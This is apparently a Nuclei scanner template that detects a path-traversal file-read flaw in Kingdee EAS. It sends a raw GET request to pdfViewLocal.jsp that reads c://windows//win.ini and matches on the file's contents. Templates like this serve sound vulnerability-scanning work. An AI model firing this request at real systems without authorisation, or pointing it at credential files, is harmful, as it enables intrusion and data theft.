id: kingdee-eas-pdfViewLocal-lfi_windows

info:
  name: Kingdee EAS - Local File Inclusion
  author: ritikchaddha
  severity: high
  description: Kingdee EAS OA lfi
  reference:
    - 1
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 2
  tags: kingdee,lfi,traversal,vuln,kingdee-eas

http:
  - raw:
      - |
        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=c://windows//win.ini HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "for 16-bit app support"

      - type: status
        status:
          - 200
